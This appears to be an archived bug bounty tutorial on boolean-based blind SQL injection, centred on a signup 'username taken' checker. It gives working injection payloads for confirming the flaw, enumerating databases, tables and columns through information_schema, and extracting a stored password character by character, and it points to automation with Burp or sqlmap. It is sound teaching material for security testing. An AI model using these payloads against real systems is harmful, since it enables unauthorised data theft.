---
title: "Bug Bounty Bootcamp #28: Boolean-Based Blind SQL Injection, Extracting Data One True/False at a Time"
author: Aman Sharma (InfoSec Write-ups)
url: https://infosecwriteups.com/bug-bounty-bootcamp-28-boolean-based-blind-sql-injection-extracting-data-one-true-false-at-a-abe69e3de702
date_published: 2026-03-10
date_scraped: 2026-11-19
platform: medium
disclosed_report: none
bounty: not stated
vuln_class: sqli
---

<!-- Member-only Medium article; the user downloaded the full article legitimately to Manual_downloads/ (per the project paywall rule) and it was folded in from there, citing the real source URL, not the freedium mirror. Images omitted. -->

# Boolean-based blind SQLi: turn a yes/no oracle into full data extraction

When the app only answers true/false (no errors, no data), you can still reconstruct the whole database by asking it one yes/no question at a time.

## The oracle scenario
A signup "username taken" checker: `admin` -> `{"taken": true}`, `asdfgh123` -> `{"taken": false}`. Behind it: `SELECT * FROM users WHERE username = 'admin';` (row returned = taken). The binary flag is the oracle.

## Phase 1: confirm the injection
- Always true: `username=admin' AND 1=1-- -` -> `{"taken": true}`.
- Always false: `username=admin' AND 1=2-- -` -> `{"taken": false}`.
If the flag flips, boolean-blind SQLi is confirmed (the app evaluates your injected logic).

## Phase 2: binary extraction building blocks
- Subqueries in the WHERE clause.
- `LIKE` to test character by character.
- `SUBSTRING()` / `MID()` to isolate a character.
Example: `admin' AND (SELECT SUBSTRING(schema_name,1,1) FROM information_schema.schemata LIMIT 0,1) = 'a'-- -` asks "does the first DB name start with 'a'?".

## Phase 3: enumerate database names
- Count: `admin' AND (SELECT COUNT(*) FROM information_schema.schemata) = 1-- -` (try =2, =3 ... until true).
- Each char via ASCII binary search: `admin' AND (SELECT ASCII(SUBSTRING(schema_name,1,1)) FROM information_schema.schemata LIMIT 0,1) > 97-- -` (97='a'); binary-search the ASCII value, then move to position 2, etc.

## Phase 4: tables and columns
- Table starting with 'u': `... (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'u%') > 0-- -`; drill `us%`, `use%`, `user%` -> `users`.
- Columns: `... information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'p%' ...` -> `password`, etc.

## Phase 5: extract the data
- Length first: `admin' AND (SELECT LENGTH(password) FROM sqli_three.users WHERE username='admin') = 8-- -`.
- Then each char: `admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM sqli_three.users WHERE username='admin') > 64-- -`; binary-search ASCII.

## The hunter's methodology
1. Identify a boolean oracle: username checkers, login success/failure, CAPTCHA verification, or any endpoint whose response (incl. HTTP status) changes by a DB condition.
2. Confirm with `AND 1=1` vs `AND 1=2`.
3. Map structure via `information_schema` + `LIKE`.
4. Extract: length, then char-by-char via substring comparisons.
5. Automate (Python / Burp Intruder with a charset payload / sqlmap), but understand the mechanics for when sqlmap fails.

Pro tip: do not brute force a-z blindly; try common predictable names first (`username`, `password`, `email`) to save hundreds of requests.

Why it matters: any feature giving a binary response based on DB content is a potential oracle; boolean-blind SQLi is everywhere and exploits apps that look "secure" because they do not leak data directly.
